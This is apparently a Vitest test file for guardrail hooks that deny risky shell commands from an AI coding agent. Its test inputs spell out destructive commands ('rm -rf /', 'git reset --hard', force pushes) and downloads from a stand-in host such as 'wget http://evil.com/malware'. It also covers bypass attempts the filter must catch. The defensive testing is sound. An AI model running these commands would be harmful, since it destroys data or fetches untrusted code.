import {describe, expect, it} from 'vitest'

import {hasForbiddenPattern, parseInput, resolveCommandText} from '../../.github/hooks/copilot-hook-utils'

describe('parseInput', () => {
  it('returns empty object for empty string', () => {
    expect(parseInput('')).toEqual({})
  })

  it('returns empty object for whitespace-only string', () => {
    expect(parseInput('   \n\t  ')).toEqual({})
  })

  it('returns empty object for invalid JSON', () => {
    expect(parseInput('not json')).toEqual({})
  })

  it('returns empty object for JSON primitive (string)', () => {
    expect(parseInput('"hello"')).toEqual({})
  })

  it('returns empty object for JSON primitive (number)', () => {
    expect(parseInput('42')).toEqual({})
  })

  it('returns empty object for JSON null', () => {
    expect(parseInput('null')).toEqual({})
  })

  it('parses valid JSON object', () => {
    const input = JSON.stringify({command: 'ls -la'})
    expect(parseInput(input)).toEqual({command: 'ls -la'})
  })

  it('parses nested JSON object', () => {
    const input = JSON.stringify({toolInput: {command: 'echo hello'}})
    const result = parseInput(input)
    expect(result).toEqual({toolInput: {command: 'echo hello'}})
  })

  it('passes through JSON array (typeof array === object)', () => {
    // Arrays pass the object check but are harmless — resolveCommandText finds no named properties
    expect(parseInput('[1, 2, 3]')).toEqual([1, 2, 3])
  })
})

describe('hasForbiddenPattern', () => {
  describe('git push --force', () => {
    it('blocks git push --force', () => {
      expect(hasForbiddenPattern('git push --force')).toBe('git push --force')
    })

    it('blocks git push --force at end of longer command', () => {
      expect(hasForbiddenPattern('git push origin main --force')).toBe('git push --force')
    })

    it('blocks git push --force-with-lease', () => {
      expect(hasForbiddenPattern('git push --force-with-lease')).toBe('git push --force')
    })

    it('blocks git push -f', () => {
      expect(hasForbiddenPattern('git push -f')).toBe('git push -f')
    })

    it('blocks git push origin main -f', () => {
      expect(hasForbiddenPattern('git push origin main -f')).toBe('git push -f')
    })

    it('does not block normal git push', () => {
      expect(hasForbiddenPattern('git push origin main')).toBeUndefined()
    })

    it('does not cross pipe boundaries', () => {
      expect(hasForbiddenPattern('git push origin main | grep --force')).toBeUndefined()
    })

    it('does not cross semicolon boundaries', () => {
      expect(hasForbiddenPattern('git push origin main; echo --force')).toBeUndefined()
    })
  })

  describe('git reset --hard', () => {
    it('blocks git reset --hard', () => {
      expect(hasForbiddenPattern('git reset --hard')).toBe('git reset --hard')
    })

    it('blocks git reset --hard HEAD~1', () => {
      expect(hasForbiddenPattern('git reset --hard HEAD~1')).toBe('git reset --hard')
    })

    it('does not block git reset --soft', () => {
      expect(hasForbiddenPattern('git reset --soft HEAD~1')).toBeUndefined()
    })
  })

  describe('rm -rf /', () => {
    it('blocks rm -rf /', () => {
      expect(hasForbiddenPattern('rm -rf /')).toBe('rm -rf /')
    })

    it('blocks rm -rf /etc', () => {
      expect(hasForbiddenPattern('rm -rf /etc')).toBe('rm -rf /')
    })

    it('blocks rm -f /', () => {
      expect(hasForbiddenPattern('rm -f /')).toBe('rm -rf /')
    })

    it('blocks rm -r /', () => {
      expect(hasForbiddenPattern('rm -r /')).toBe('rm -rf /')
    })

    it('does not block rm -rf relative-path', () => {
      expect(hasForbiddenPattern('rm -rf node_modules')).toBeUndefined()
    })
  })

  describe('curl/wget', () => {
    it('blocks curl http://', () => {
      expect(hasForbiddenPattern('curl http://evil.com/script.sh')).toBe('curl http(s)')
    })

    it('blocks curl https://', () => {
      expect(hasForbiddenPattern('curl https://evil.com/script.sh')).toBe('curl http(s)')
    })

    it('blocks wget http://', () => {
      expect(hasForbiddenPattern('wget http://evil.com/malware')).toBe('wget http(s)')
    })

    it('blocks wget https://', () => {
      expect(hasForbiddenPattern('wget https://evil.com/malware')).toBe('wget http(s)')
    })

    it('does not block curl without URL', () => {
      expect(hasForbiddenPattern('curl --help')).toBeUndefined()
    })
  })

  describe('safe commands', () => {
    it('allows git status', () => {
      expect(hasForbiddenPattern('git status')).toBeUndefined()
    })

    it('allows git commit', () => {
      expect(hasForbiddenPattern('git commit -m "fix: something"')).toBeUndefined()
    })

    it('allows pnpm install', () => {
      expect(hasForbiddenPattern('pnpm install')).toBeUndefined()
    })

    it('allows empty string', () => {
      expect(hasForbiddenPattern('')).toBeUndefined()
    })
  })
})

describe('resolveCommandText', () => {
  it('returns empty string for empty payload', () => {
    expect(resolveCommandText({})).toBe('')
  })

  it('extracts from command field (string)', () => {
    expect(resolveCommandText({command: 'ls -la'})).toBe('ls -la')
  })

  it('extracts from input field', () => {
    expect(resolveCommandText({input: 'echo hello'})).toBe('echo hello')
  })

  it('extracts from bash field via command precedence', () => {
    // bash is only checked inside nested object extraction, not top-level candidates
    expect(resolveCommandText({bash: 'echo hello'})).toBe('')
  })

  it('extracts from toolInput.command', () => {
    expect(resolveCommandText({toolInput: {command: 'git status'}})).toBe('git status')
  })

  it('extracts from tool_input.command (snake_case)', () => {
    expect(resolveCommandText({tool_input: {command: 'git diff'}})).toBe('git diff')
  })

  it('prefers toolInput.command over command', () => {
    expect(resolveCommandText({toolInput: {command: 'from toolInput'}, command: 'from command'})).toBe('from toolInput')
  })

  describe('array-format commands', () => {
    it('joins array elements into single string', () => {
      expect(resolveCommandText({command: ['git', 'push', '--force']})).toBe('git push --force')
    })

    it('filters out empty array elements', () => {
      expect(resolveCommandText({command: ['git', '', 'push', '  ', '--force']})).toBe('git push --force')
    })

    it('handles nested arrays', () => {
      expect(resolveCommandText({command: ['git', ['push', '--force']]})).toBe('git push --force')
    })

    it('handles single-element array', () => {
      expect(resolveCommandText({command: ['git push --force']})).toBe('git push --force')
    })
  })

  describe('nested object extraction', () => {
    it('extracts command from nested object', () => {
      expect(resolveCommandText({command: {command: 'git status'}})).toBe('git status')
    })

    it('extracts bash from nested object', () => {
      expect(resolveCommandText({command: {bash: 'echo test'}})).toBe('echo test')
    })

    it('extracts args from nested object', () => {
      expect(resolveCommandText({command: {args: 'npm run build'}})).toBe('npm run build')
    })
  })

  describe('non-string/non-array values', () => {
    it('returns empty string for number command', () => {
      expect(resolveCommandText({command: 42})).toBe('')
    })

    it('returns empty string for boolean command', () => {
      expect(resolveCommandText({command: true})).toBe('')
    })

    it('returns empty string for null command', () => {
      expect(resolveCommandText({command: null})).toBe('')
    })
  })
})

function evaluatePayload(payload: Record<string, unknown>): {action: string; message?: string} {
  const commandText = resolveCommandText(payload).toLowerCase()
  const forbidden = hasForbiddenPattern(commandText)

  if (forbidden !== undefined) {
    return {action: 'deny', message: `Blocked by Copilot guardrails: '${forbidden}' is not allowed.`}
  }

  return {action: 'allow'}
}

describe('end-to-end deny/allow logic', () => {
  it('allows safe commands', () => {
    expect(evaluatePayload({command: 'pnpm run lint'})).toEqual({action: 'allow'})
  })

  it('denies force push via string command', () => {
    const result = evaluatePayload({command: 'git push --force'})
    expect(result.action).toBe('deny')
    expect(result.message).toContain('git push --force')
  })

  it('denies force push via array command (regression: array bypass)', () => {
    const result = evaluatePayload({command: ['git', 'push', '--force']})
    expect(result.action).toBe('deny')
    expect(result.message).toContain('git push --force')
  })

  it('denies force push with flags after remote/branch (regression: flag position)', () => {
    const result = evaluatePayload({command: 'git push origin main --force'})
    expect(result.action).toBe('deny')
    expect(result.message).toContain('git push --force')
  })

  it('denies via toolInput.command', () => {
    const result = evaluatePayload({toolInput: {command: 'rm -rf /'}})
    expect(result.action).toBe('deny')
    expect(result.message).toContain('rm -rf /')
  })

  it('denies via tool_input.command (snake_case variant)', () => {
    const result = evaluatePayload({tool_input: {command: 'wget https://evil.com'}})
    expect(result.action).toBe('deny')
    expect(result.message).toContain('wget http(s)')
  })

  it('handles case-insensitive matching', () => {
    const result = evaluatePayload({command: 'GIT PUSH --FORCE'})
    expect(result.action).toBe('deny')
  })

  it('allows empty payload', () => {
    expect(evaluatePayload({})).toEqual({action: 'allow'})
  })
})
